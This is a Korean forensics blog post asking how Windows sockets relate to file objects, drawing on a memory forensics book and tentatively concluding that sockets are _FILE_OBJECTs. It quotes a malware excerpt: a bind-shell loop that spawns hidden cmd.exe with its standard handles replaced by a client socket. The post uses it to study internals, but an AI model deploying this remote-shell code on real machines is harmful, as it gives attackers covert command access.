(포렌식)소켓의 실체는 무엇인가?

by Pragmo

September 20, 2022
in Forensic

배경지식

콘솔 프로그램이 실행될때 프로그램 내부에선 입력을 받는 입력버퍼의 핸들과 출력을 내는 출력버퍼의 핸들, 오류메시지를 내는 버퍼의 핸들을 가지고 있다

즉 printf로 문자열을 출력한다는건 곧 출력버퍼의 핸들을 통해 출력버퍼에 값을 쓰는 행위이고 scanf로 문자열 값을 받는다는건 입력버퍼의 핸들을 통해 입력버퍼를 읽어들이는 행위이다

얼마 전에 이 사실을 직접 관찰하고 싶어서 올리디버거로 printf 내부를 들여다봤다

아니나 다를까 내부적으로 WriteFile을 호출한다

출력버퍼라는 _FILE_OBJECT에 값을 쓰는 것이다

scanf도 역시 내부적으로 ReadFile을 호출한다

그 후 메모리 포렌식(혜지원)이라는 책을 읽다가 297p에서 어떤 악성코드의 소스코드를 봤는데 내용이 충격적이었다

아래는 소스코드의 일부이다

while(1)
{
    myCliSock = SOCKET_ERROR;
    while(myCliSock == SOCKET_ERROR)
    {
        Sleep(1);
        listen(myMainSock, SOMAXCONN);
        ulSzSockAddr = sizeof(myCliSockAddr);
        myCliSock = accept(myMainSock, (SOCKADDR*)&myCliSockAddr, (int*)&ulSzSockAddr);
    }
    memset(&mySi, 0, sizeof(mySi));
    memset(&myPi, 0, sizeof(myPi));

    mySi.wShowWindow = SW_HIDE;
    mySi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    // 입출력 핸들을 소켓 핸들로 교체함
    mySi.hStdError = (VOID*)myCliSock;
    mySi.hStdInput = (VOID*)myCliSock;
    mySi.hStdOutput = (VOID*)myCliSock;
    CreateProcess(0, wcsdup(L"cmd.exe"), 0, 0, 1 /* 핸들 테이블 상속 = 1 */, 0, 0, 0, &mySi, &myPi);
}

그냥 원격 쉘 실행 프로그램인데, 구현을 어떻게 했는지 보니 소스코드에 나와있듯이 cmd.exe의 입출력 핸들값을 해커와의 연결이 형성된 소켓의 핸들값으로 교체후 자식 프로세스로 실행하는 식으로 동작했다

즉 cmd.exe가 실행되면 입출력을 수행할 때마다 소켓을 ReadFile또는 WriteFile로 조작하게 된다

그렇다면 소켓도 역시 _FILE_OBJECT로 할당이 되어있는것인가?

궁금해서 직접 소스를 짜보니 소켓통신도 send나 recv대신에 WriteFile이나 ReadFile로 가능하긴 했다!

그래 그렇구나, 소켓도 커널 풀에는 File로 할당이 되어있구나 생각했었다

그러나 메모리 포렌식 책의 네트워크 파트를 읽으며 조금 혼란이 오기 시작했다

책의 그림 11-1과 11-2에서 socket()은 \Device\Afd\Endpoint의 핸들을 연다고 나와있다

이건 커널 모드의 Afd.sys와 통신하기 위한 오브젝트인데 Afd.sys는 Winsock2를 보조한다고 한다

여기서 추측할 수 있는 바로 socket()이 반환하는 값은 \Device\Afd\Endpoint의 핸들값일 것이다

이후 bind()나 connect()를 할 때 \Device\Tcp의 핸들을 추가로 연다

\Device\Tcp는 tcpip.sys 드라이버와 관련이 있는 것 같은 느낌인데 책의 그림 11-4에 나온대로 tcpip.sys는 _TCP_ENDPOINT, _TCP_LISTENER, _UDP_ENDPOINT라는 연결 관련 정보를 관리하기 때문에

해당 구조의 흔적을 토대로 메모리에서 통신 기록 포렌식이 가능하다는게 책의 네트워크 파트 내용이다

소켓의 실체에 관한 의문점

그럼 \Device\Afd\Endpoint는 연결과 관련돤 정보를 관리하지 않는 건가?

아니 애초에 \Device\Afd\Endpoint는 _FILE_OBJECT로 확인이 되는데 연결정보는 어떻게 관리하나

해서 둘이 어떻게 연결이 되는지 찾아봤는데 영어로 검색해도 정보가 많지않다 사람들이 관심이 없는건지..

지금까지의 의문점을 정리하면

  1. 소켓(\Device\Afd\Endpoint)과 네트워크 연결정보(_TCP_ENDPOINT, _TCP_LISTENER, _UDP_ENDPOINT)는 어떻게 연결이 되는가
  2. \Device\Afd\Endpoint는 File인데 네트워크 연결정보를 관리할 수 있는가

정도이다

정보가 너무 없기때문에 감히 내가 추측해보기로는

  1. \Device\Afd\Endpoint에서 데이터를 형식을 갖춰 저장한다
  2. \Device\Afd\Endpoint자체에서 네트워크 연결 정보를 저장하는게 아니라 Afd.sys측에서 어떤 테이블 구조를 가지고 있다

이렇게 한참을 고민하다가 네이버에서 배포한 문서를 찾았다

리눅스 소켓의 구조에 관한 설명이 깔끔하게 정리되어있다

문서에 따르면 리눅스 소켓은 일단 File이 맞다고 한다

근데 File구조에서 Socket구조체를 연결하기 때문에 이를 통해서 네트워크 정보를 찾을 수 있다고 한다

윈도우도 비슷할 것이라 생각해 _FILE_OBJECT구조를 뜯어보니 _DEVICE_OBJECT에 대한 포인터나 _IO_COMPLETION_CONTEXT에 대한 포인터 등 뭔가 이어지는 분위기의 멤버들이 보인다

그래서 아마도 윈도우도 비슷하지 않을까? 생각해서

잠정 결론

소켓은 _FILE_OBJECT이고 _FILE_OBJECT의 멤버중에서 네트워크 정보로 연결되는 포인터가 있다 정도로 정리하고 다음파트 공부하려고 한다
